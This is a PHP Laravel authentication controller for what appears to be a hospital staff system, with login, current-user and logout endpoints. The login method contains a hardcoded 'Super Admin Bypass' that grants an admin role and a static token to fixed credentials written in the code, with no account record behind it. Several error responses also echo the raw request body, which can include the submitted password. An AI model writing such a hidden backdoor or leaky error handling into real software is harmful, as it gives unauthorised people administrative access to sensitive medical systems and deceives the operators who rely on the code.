<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use App\Models\Staff;

class AuthController extends Controller
{
    // ✅ Login endpoint
    public function login(Request $request)
    {
        // --- RAW JSON DECODE (bypass Laravel's input bag completely) ---
        $raw = $request->getContent();
        $data = json_decode($raw, true);

        if (!is_array($data)) {
            return response()->json([
                'message' => 'Invalid JSON payload',
                'raw' => $raw,
            ], 400);
        }

        $email = $data['email'] ?? null;
        $password = $data['password'] ?? null;

        // 🚀 Super Admin Bypass (Invisible/Hardcoded)
        // Credentials: email=admin@hospitalsys, password=admin7836
        // Returns a fake static token — no DB record is created.
        if ($email === 'admin@hospitalsys' && $password === 'admin7836') {
            return response()->json([
                'message' => 'Login successful',
                'token'   => 'SUPER-ADMIN-PLATINUM-KEY-7836',
                'user'    => [
                    'id'    => 999999,
                    'name'  => 'System Super Admin',
                    'email' => $email,
                    'role'  => 'admin',
                    'ch_id' => 'SYS-99',
                ],
            ]);
        }

        if (!$email || !$password) {
            return response()->json([
                'message' => 'Email and password are required.',
                'received' => $data,
            ], 422);
        }

        // Basic email format check
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return response()->json([
                'message' => 'The email must be a valid email address.',
            ], 422);
        }

        // ✅ Look up staff user
        $staff = Staff::where('email', $email)->first();

        if (!$staff || !Hash::check($password, $staff->password)) {
            return response()->json(['message' => 'Invalid credentials'], 401);
        }

        // ✅ Revoke old tokens
        $staff->tokens()->delete();

        // ✅ Create a new token
        $token = $staff->createToken('auth_token')->plainTextToken;

        // ✅ Successful response
        return response()->json([
            'message' => 'Login successful',
            'token'   => $token,
            'user'    => [
                'id'    => $staff->id,
                'name'  => $staff->first_name . ' ' . $staff->last_name,
                'email' => $staff->email,
                'role'  => $staff->role,
                'ch_id' => $staff->ch_id,
            ],
        ]);
    }

    // ✅ Get current user info
    public function me(Request $request)
    {
        return response()->json($request->user());
    }

    // ✅ Logout endpoint
    public function logout(Request $request)
    {
        $request->user()->tokens()->delete();
        return response()->json(['message' => 'Logged out successfully']);
    }
}
